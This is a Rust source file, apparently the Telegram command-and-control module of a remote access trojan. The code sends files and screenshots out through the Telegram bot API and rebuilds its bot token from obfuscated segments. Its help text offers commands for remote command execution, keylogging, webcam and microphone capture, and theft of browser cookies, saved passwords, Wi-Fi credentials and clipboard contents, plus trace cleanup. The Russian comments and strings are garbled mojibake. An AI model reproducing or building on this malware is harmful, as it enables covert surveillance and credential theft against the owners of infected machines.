use std::collections::HashMap;
use std::sync::Arc;
use serde::Deserialize;
use anyhow::{Result, Context};
use reqwest::{Client, multipart::Form};
use tokio::time::{sleep, Duration};

use crate::config::{POLLING_INTERVAL_MS, HTTP_TIMEOUT_SECONDS};
use crate::auth;
use crate::token_security;

/// –°—Ç—Ä—É–∫—Ç—É—Ä–∞ –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π –æ—Ç Telegram
#[derive(Debug, Deserialize)]
pub struct Update {
    pub update_id: i64,
    pub message: Option<Message>,
}

/// –°—Ç—Ä—É–∫—Ç—É—Ä–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç Telegram
#[derive(Debug, Deserialize)]
pub struct Message {
    pub message_id: i64,
    pub from: Option<User>,
    pub chat: Chat,
    pub date: i64,
    pub text: Option<String>,
    pub document: Option<Document>,
}

/// User structure
#[derive(Debug, Deserialize)]
pub struct User {
    pub id: i64,
    pub is_bot: bool,
    pub first_name: String,
    pub last_name: Option<String>,
    pub username: Option<String>,
}

/// Chat structure
#[derive(Debug, Deserialize)]
pub struct Chat {
    pub id: i64,
    pub r#type: String,
}

/// –°—Ç—Ä—É–∫—Ç—É—Ä–∞ –¥–æ–∫—É–º–µ–Ω—Ç–∞
#[derive(Debug, Deserialize)]
pub struct Document {
    pub file_id: String,
    pub file_unique_id: String,
    pub file_name: Option<String>,
    pub mime_type: Option<String>,
    pub file_size: Option<i64>,
}

/// –û—Ç–≤–µ—Ç –æ—Ç Telegram API
#[derive(Debug, Deserialize)]
pub struct TelegramResponse<T> {
    pub ok: bool,
    pub result: Option<T>,
    pub description: Option<String>,
}

/// –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Ñ–∞–π–ª–µ
#[derive(Debug, Deserialize)]
pub struct FileInfo {
    pub file_id: String,
    pub file_unique_id: String,
    pub file_size: Option<i64>,
    pub file_path: Option<String>,
}

/// Telegram Bot –∫–ª–∏–µ–Ω—Ç
#[derive(Debug, Clone)]
pub struct TelegramClient {
    client: Client,
    bot_token: String,
    base_url: String,
    last_update_id: Arc<std::sync::Mutex<i64>>,
}

impl TelegramClient {
    /// –°–æ–∑–¥–∞–µ—Ç –Ω–æ–≤—ã–π –∫–ª–∏–µ–Ω—Ç
    pub fn new() -> Self {
        let client = Client::builder()
            .timeout(Duration::from_secs(HTTP_TIMEOUT_SECONDS))
            .build()
            .expect("Failed to create HTTP client");

        // üîê –ë–ï–ó–û–ü–ê–°–ù–û–ï –ü–û–õ–£–ß–ï–ù–ò–ï –¢–û–ö–ï–ù–ê –ò–ó –ó–ê–®–ò–§–†–û–í–ê–ù–ù–´–• –ß–ê–°–¢–ï–ô
        let secure_token = token_security::get_secure_bot_token()
            .expect("Failed to reconstruct bot token from encrypted segments");

        Self {
            client,
            bot_token: secure_token.clone(),
            base_url: format!("https://api.telegram.org/bot{}", secure_token),
            last_update_id: Arc::new(std::sync::Mutex::new(0)),
        }
    }

    /// –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ç–µ–∫—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
    pub async fn send_message(&self, chat_id: i64, text: &str) -> Result<()> {
        let url = format!("{}/sendMessage", self.base_url);
        
        let mut params = HashMap::new();
        params.insert("chat_id", chat_id.to_string());
        // –≠–∫—Ä–∞–Ω–∏—Ä—É–µ–º —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã –¥–ª—è Markdown
        let escaped_text = self.escape_markdown(text);
        params.insert("text", escaped_text);
        params.insert("parse_mode", "Markdown".to_string());
        
        let response = self.client
            .post(&url)
            .json(&params)
            .send()
            .await
            .context("Failed to send message")?;

        if !response.status().is_success() {
            let error_text = response.text().await.unwrap_or_else(|_| "Unknown error".to_string());
            return Err(anyhow::anyhow!("Telegram API error: {}", error_text));
        }

        Ok(())
    }
    
    /// –≠–∫—Ä–∞–Ω–∏—Ä—É–µ—Ç —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã –¥–ª—è Markdown
    fn escape_markdown(&self, text: &str) -> String {
        text.replace("\\", "\\\\")
            .replace("_", "\\_")
            .replace("*", "\\*")
            .replace("[", "\\[")
            .replace("]", "\\]")
            .replace("(", "\\(")
            .replace(")", "\\)")
            .replace("~", "\\~")
            .replace("`", "\\`")
            .replace(">", "\\>")
            .replace("#", "\\#")
            .replace("+", "\\+")
            .replace("-", "\\-")
            .replace("=", "\\=")
            .replace("|", "\\|")
            .replace("{", "\\{")
            .replace("}", "\\}")
            .replace(".", "\\.")
            .replace("!", "\\!")
    }

    /// –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ñ–∞–π–ª
    pub async fn send_document(&self, chat_id: i64, file_path: &str, caption: Option<&str>) -> Result<()> {
        let url = format!("{}/sendDocument", self.base_url);
        
        let file_data = tokio::fs::read(file_path).await
            .context("Failed to read file")?;
        
        let file_name = std::path::Path::new(file_path)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("file");

        let mut form = Form::new()
            .text("chat_id", chat_id.to_string())
            .part("document", reqwest::multipart::Part::bytes(file_data).file_name(file_name.to_string()));

        if let Some(caption) = caption {
            form = form.text("caption", caption.to_string());
        }

        let response = self.client
            .post(&url)
            .multipart(form)
            .send()
            .await
            .context("Failed to send document")?;

        if !response.status().is_success() {
            let error_text = response.text().await.unwrap_or_else(|_| "Unknown error".to_string());
            return Err(anyhow::anyhow!("Telegram API error: {}", error_text));
        }

        Ok(())
    }

    /// –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ñ–æ—Ç–æ
    pub async fn send_photo(&self, chat_id: i64, photo_data: Vec<u8>, caption: Option<&str>) -> Result<()> {
        let url = format!("{}/sendPhoto", self.base_url);
        
        let mut form = Form::new()
            .text("chat_id", chat_id.to_string())
            .part("photo", reqwest::multipart::Part::bytes(photo_data).file_name("screenshot.png"));

        if let Some(caption) = caption {
            form = form.text("caption", caption.to_string());
        }

        let response = self.client
            .post(&url)
            .multipart(form)
            .send()
            .await
            .context("Failed to send photo")?;

        if !response.status().is_success() {
            let error_text = response.text().await.unwrap_or_else(|_| "Unknown error".to_string());
            return Err(anyhow::anyhow!("Telegram API error: {}", error_text));
        }

        Ok(())
    }

    /// –ü–æ–ª—É—á–∞–µ—Ç –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –æ—Ç Telegram
    pub async fn get_updates(&self) -> Result<Vec<Update>> {
        let url = format!("{}/getUpdates", self.base_url);
        
        let last_id = {
            let guard = self.last_update_id.lock().unwrap();
            *guard + 1
        };
        
        let mut params = HashMap::new();
        params.insert("offset", last_id.to_string());
        params.insert("timeout", "10".to_string());

        let response = self.client
            .post(&url)
            .json(&params)
            .send()
            .await
            .context("Failed to get updates")?;

        let response_text = response.text().await?;
        let telegram_response: TelegramResponse<Vec<Update>> = serde_json::from_str(&response_text)
            .context("Failed to parse Telegram response")?;

        if !telegram_response.ok {
            return Err(anyhow::anyhow!("Telegram API error: {:?}", telegram_response.description));
        }

        let updates = telegram_response.result.unwrap_or_default();
        
        // –û–±–Ω–æ–≤–ª—è–µ–º last_update_id
        if let Some(last_update) = updates.last() {
            let mut guard = self.last_update_id.lock().unwrap();
            *guard = last_update.update_id;
        }

        Ok(updates)
    }

    /// –°–∫–∞—á–∏–≤–∞–µ—Ç —Ñ–∞–π–ª –ø–æ file_id
    pub async fn download_file(&self, file_id: &str) -> Result<Vec<u8>> {
        // –°–Ω–∞—á–∞–ª–∞ –ø–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ñ–∞–π–ª–µ
        let file_info = self.get_file_info(file_id).await?;
        
        if let Some(file_path) = file_info.file_path {
            let download_url = format!("https://api.telegram.org/file/bot{}/{}", self.bot_token, file_path);
            
            let response = self.client
                .get(&download_url)
                .send()
                .await
                .context("Failed to download file")?;

            if response.status().is_success() {
                let bytes = response.bytes().await
                    .context("Failed to read file bytes")?;
                Ok(bytes.to_vec())
            } else {
                Err(anyhow::anyhow!("Failed to download file: HTTP {}", response.status()))
            }
        } else {
            Err(anyhow::anyhow!("File path not available"))
        }
    }

    /// –ü–æ–ª—É—á–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ñ–∞–π–ª–µ
    async fn get_file_info(&self, file_id: &str) -> Result<FileInfo> {
        let url = format!("{}/getFile", self.base_url);
        
        let mut params = HashMap::new();
        params.insert("file_id", file_id.to_string());

        let response = self.client
            .post(&url)
            .json(&params)
            .send()
            .await
            .context("Failed to get file info")?;

        let response_text = response.text().await?;
        let telegram_response: TelegramResponse<FileInfo> = serde_json::from_str(&response_text)
            .context("Failed to parse file info response")?;

        if telegram_response.ok {
            telegram_response.result.ok_or_else(|| anyhow::anyhow!("No file info in response"))
        } else {
            Err(anyhow::anyhow!("Telegram API error: {:?}", telegram_response.description))
        }
    }

    /// –ü—Ä–æ–≤–µ—Ä—è–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é —Å–æ–æ–±—â–µ–Ω–∏—è —á–µ—Ä–µ–∑ Argon2 —Ö–µ—à
    pub fn is_message_authorized(&self, message: &Message) -> bool {
        auth::is_authorized_chat(message.chat.id)
    }

    /// –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
    pub async fn send_unauthorized_message(&self, chat_id: i64) -> Result<()> {
        let message = "üö´ –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —ç—Ç–æ–≥–æ –±–æ—Ç–∞.";
        self.send_message(chat_id, message).await
    }

    /// –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–ø—Ä–∞–≤–∫—É
    pub async fn send_help(&self, chat_id: i64) -> Result<()> {
        let help_text = r#"
ü§ñ **–ö–æ–º–∞–Ω–¥—ã –±–æ—Ç–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è:**

**üìã –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:**
‚Ä¢ `/devices` - —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤
‚Ä¢ `/info <id>` - –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
‚Ä¢ `/ipinfo <id>` - –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± IP –∏ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏

**üìÅ –§–∞–π–ª–æ–≤–∞—è —Å–∏—Å—Ç–µ–º–∞:**
‚Ä¢ `/listdrives <id>` - —Å–ø–∏—Å–æ–∫ –¥–∏—Å–∫–æ–≤
‚Ä¢ `/listdirs <id> <path>` - —Å–ø–∏—Å–æ–∫ –ø–∞–ø–æ–∫
‚Ä¢ `/listfiles <id> <path>` - —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤
‚Ä¢ `/download <id> <file>` - —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª
‚Ä¢ `/upload <id> <path>` - –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª

**‚öôÔ∏è –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥:**
‚Ä¢ `/exec <id> <command>` - –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É
‚Ä¢ `/start <id> <app> <params>` - –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
‚Ä¢ `/apps <id>` - —Å–ø–∏—Å–æ–∫ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º
‚Ä¢ `/popup <id> <text>` - –ø–æ–∫–∞–∑–∞—Ç—å –≤—Å–ø–ª—ã–≤–∞—é—â–µ–µ –æ–∫–Ω–æ

**üì∏ –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥:**
‚Ä¢ `/screenshot <id>` - —Å–Ω–∏–º–æ–∫ —ç–∫—Ä–∞–Ω–∞
‚Ä¢ `/webcam <id> <delay> <camera>` - —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã
‚Ä¢ `/keylogger <id>` - –ª–æ–≥ –Ω–∞–∂–∞—Ç–∏–π –∫–ª–∞–≤–∏—à
‚Ä¢ `/micrec <id>` - –∑–∞–ø–∏—Å—å —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞

**üîê –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å:**
‚Ä¢ `/cookies <id>` - —Ñ–∞–π–ª—ã cookies –±—Ä–∞—É–∑–µ—Ä–∞
‚Ä¢ `/weblogins <id>` - —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –ø–∞—Ä–æ–ª–∏ –±—Ä–∞—É–∑–µ—Ä–∞
‚Ä¢ `/wifiprofiles <id>` - –ø—Ä–æ—Ñ–∏–ª–∏ Wi-Fi —Å –ø–∞—Ä–æ–ª—è–º–∏
‚Ä¢ `/getclipboard <id>` - —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞

**üîß –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:**
‚Ä¢ `/startup <id>` - —Å–ø–∏—Å–æ–∫ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
‚Ä¢ `/url <id> <link>` - –æ—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É
‚Ä¢ `/reroll <id>` - –∏–∑–º–µ–Ω–∏—Ç—å ID —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
‚Ä¢ `/cleanup <id>` - –æ—á–∏—Å—Ç–∫–∞ —Å–ª–µ–¥–æ–≤ —Ä–∞–±–æ—Ç—ã
‚Ä¢ `/selfdestruct <id>` - —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ (Pentagon Algorithm)

**üí° –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ:**
‚Ä¢ `/help` - —ç—Ç–∞ —Å–ø—Ä–∞–≤–∫–∞

*–ó–∞–º–µ–Ω–∏—Ç–µ `<id>` –Ω–∞ ID —Ü–µ–ª–µ–≤–æ–≥–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –∏–∑ –∫–æ–º–∞–Ω–¥—ã `/devices`*
"#;
        
        self.send_message(chat_id, help_text).await
    }

    /// –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª polling
    pub async fn start_polling<F>(&self, mut handler: F) -> Result<()>
    where
        F: FnMut(Message) -> Result<()> + Send,
    {
        log::info!("Starting Telegram bot polling...");
        
        loop {
            match self.get_updates().await {
                Ok(updates) => {
                    for update in updates {
                        if let Some(message) = update.message {
                            if !self.is_message_authorized(&message) {
                                log::warn!("Unauthorized access attempt from chat_id: {}", message.chat.id);
                                let _ = self.send_unauthorized_message(message.chat.id).await;
                                continue;
                            }

                            if let Err(e) = handler(message) {
                                log::error!("Error handling message: {}", e);
                            }
                        }
                    }
                }
                Err(e) => {
                    log::error!("Error getting updates: {}", e);
                    sleep(Duration::from_millis(5000)).await;
                }
            }
            
            sleep(Duration::from_millis(POLLING_INTERVAL_MS)).await;
        }
    }

    /// –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –¥–ª–∏–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ, —Ä–∞–∑–±–∏–≤–∞—è –µ–≥–æ –Ω–∞ —á–∞—Å—Ç–∏ –µ—Å–ª–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ
    pub async fn send_long_message(&self, chat_id: i64, text: &str) -> Result<()> {
        const MAX_MESSAGE_LENGTH: usize = 4096;
        
        if text.len() <= MAX_MESSAGE_LENGTH {
            return self.send_message(chat_id, text).await;
        }
        
        let chunks: Vec<String> = text
            .chars()
            .collect::<Vec<char>>()
            .chunks(MAX_MESSAGE_LENGTH)
            .map(|chunk| chunk.iter().collect::<String>())
            .collect();
            
        for (i, chunk) in chunks.iter().enumerate() {
            let message = if i == 0 {
                chunk.to_string()
            } else {
                format!("**–ü—Ä–æ–¥–æ–ª–∂–µ–Ω–∏–µ ({}/{}):**\n{}", i + 1, chunks.len(), chunk)
            };
            
            self.send_message(chat_id, &message).await?;
            
            // –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É —Å–æ–æ–±—â–µ–Ω–∏—è–º–∏
            if i < chunks.len() - 1 {
                sleep(Duration::from_millis(100)).await;
            }
        }
        
        Ok(())
    }

    /// –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ —Å —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ–º –¥–ª—è –∫–æ–º–∞–Ω–¥
    pub async fn send_command_response(&self, chat_id: i64, device_id: &str, command: &str, result: &str) -> Result<()> {
        let formatted = format!(
            "üñ•Ô∏è **–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:** `{}`\n\
            ‚ö° **–ö–æ–º–∞–Ω–¥–∞:** `{}`\n\
            üì§ **–†–µ–∑—É–ª—å—Ç–∞—Ç:**\n```\n{}\n```",
            device_id, command, result
        );
        
        self.send_long_message(chat_id, &formatted).await
    }

    /// –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ
    pub async fn send_error(&self, chat_id: i64, error: &str) -> Result<()> {
        let formatted = format!("‚ùå **–û—à–∏–±–∫–∞:** {}", error);
        self.send_message(chat_id, &formatted).await
    }
}
